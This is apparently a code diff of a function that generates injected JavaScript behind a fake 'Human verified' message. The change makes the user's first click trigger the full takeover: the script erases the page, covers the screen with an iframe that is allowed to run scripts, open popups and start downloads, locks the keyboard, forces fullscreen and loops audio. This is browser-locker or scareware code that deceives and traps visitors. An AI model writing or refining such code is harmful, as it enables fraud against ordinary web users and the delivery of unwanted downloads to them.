@@ -288,27 +288,30 @@ function buildSecondaryJS(origin) {
 
   return `
   console.log("%c✅ Human verified. Waiting for user interaction...", "color:#0f0;font-size:18px;font-weight:bold");
-   document.body.innerHTML = null;
-  document.documentElement.style.overflow = 'hidden';
-  document.body.insertAdjacentHTML('afterbegin', '<div id="bruceDiv" style="position:fixed;top:0;left:0;width:100%;z-index:99999999;pointer-events:auto;overflow:hidden;"></div>');
+  var hasStarted = false;
+  document.addEventListener('click', function initGame() {
+      if (hasStarted) return;
+      hasStarted = true;
 
-  var iframe = document.createElement('iframe');
-    iframe.src = ${JSON.stringify(srcUrl)};
-    iframe.style.width = '100%';
-    iframe.style.height = '100%';
-    iframe.frameBorder = '0';
-    iframe.setAttribute('allowfullscreen', '');
-    iframe.setAttribute('webkitallowfullscreen', '');
-    iframe.setAttribute('mozallowfullscreen', '');
-    iframe.sandbox = 'allow-scripts allow-popups allow-downloads';
-    var bruceDiv = document.getElementById('bruceDiv');
-    bruceDiv.appendChild(iframe);
-    bruceDiv.style.height = '100vh';
+      document.body.innerHTML = null;
+      document.documentElement.style.overflow = 'hidden';
+      document.body.insertAdjacentHTML('afterbegin', '<div id="bruceDiv" style="position:fixed;top:0;left:0;width:100%;z-index:99999999;pointer-events:auto;overflow:hidden;"></div>');
 
-    navigator.keyboard.lock();
+      var iframe = document.createElement('iframe');
+      iframe.src = ${JSON.stringify(srcUrl)};
+      iframe.style.width = '100%';
+      iframe.style.height = '100%';
+      iframe.frameBorder = '0';
+      iframe.setAttribute('allowfullscreen', '');
+      iframe.setAttribute('webkitallowfullscreen', '');
+      iframe.setAttribute('mozallowfullscreen', '');
+      iframe.sandbox = 'allow-scripts allow-popups allow-downloads';
+      var bruceDiv = document.getElementById('bruceDiv');
+      bruceDiv.appendChild(iframe);
+      bruceDiv.style.height = '100vh';
 
-  setTimeout(function() {
-    document.addEventListener('click', function initGame() {
+      navigator.keyboard.lock();
+
       // Request fullscreen with all vendor prefixes
       setTimeout(function() {
         var el = document.documentElement;
@@ -332,7 +335,6 @@ function buildSecondaryJS(origin) {
       audio2.loop = true;
       audio2.play().catch(function(e) { console.warn('Audio 2 blocked:', e); });
     }, { once: true });
-  }, 1200);
 `;
 }
 
